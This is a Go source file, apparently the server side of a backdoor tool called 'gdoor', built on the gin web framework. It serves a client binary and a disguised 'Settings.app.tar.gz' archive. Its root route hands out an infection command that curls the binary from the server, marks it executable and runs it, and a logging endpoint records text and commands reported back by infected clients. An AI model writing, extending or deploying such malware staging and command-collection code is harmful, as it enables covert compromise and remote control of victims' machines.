package service

import(
  "net/http"
  "io/ioutil"
  "fmt"
  "os"

  "github.com/gin-gonic/gin"

  "../config"
)

func Service(){
  gin.SetMode(gin.ReleaseMode)
  r := gin.New()
  gin.DefaultWriter = ioutil.Discard

  r.GET("/", InfectCmd)
  r.POST("/log", ClientLog)
  r.StaticFile("/gdoor", "./client")
  r.StaticFile("/root", "./Settings.app.tar.gz")

  go r.Run(config.FServerPort)
}

func InfectCmd(c *gin.Context){
  cmd := "curl -s " + config.ServerIP + config.FServerPort + "/gdoor > ./gdoor && chmod +x ./gdoor && ./gdoor"
  c.String(http.StatusOK, cmd)
}

func ClientLog(c *gin.Context){
  log := struct{
    token string
    id    string
    text  string
    cmd   string
    time  string
  }{
    token:  c.PostForm("token"),
    id:     c.PostForm("id"),
    text:   c.PostForm("text"),
    cmd:    c.PostForm("cmd"),
    time:   c.PostForm("time"),
  }

  // Create log string
  logStr := fmt.Sprintf("[%s][%s]%s", log.time, log.id, log.text)
  if log.cmd != "" {
    logStr = fmt.Sprintf("%s (%s)", logStr, log.cmd)
  }
  logStr += "\n"

  // Create log directory
  if _, err := os.Stat("./log"); os.IsNotExist(err) {
    err = os.Mkdir("./log", 0755)
    if err != nil {
      c.Status(http.StatusInternalServerError)
      return
    }
  }

  // Write log
  f, err := os.OpenFile(fmt.Sprintf("./log/%s.log", log.token), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
  if err != nil {
    c.Status(http.StatusInternalServerError)
    return
  }
  defer f.Close()

  if _, err := f.Write([]byte(logStr)); err != nil {
    c.Status(http.StatusInternalServerError)
    return
  }

  c.Status(http.StatusOK)
}
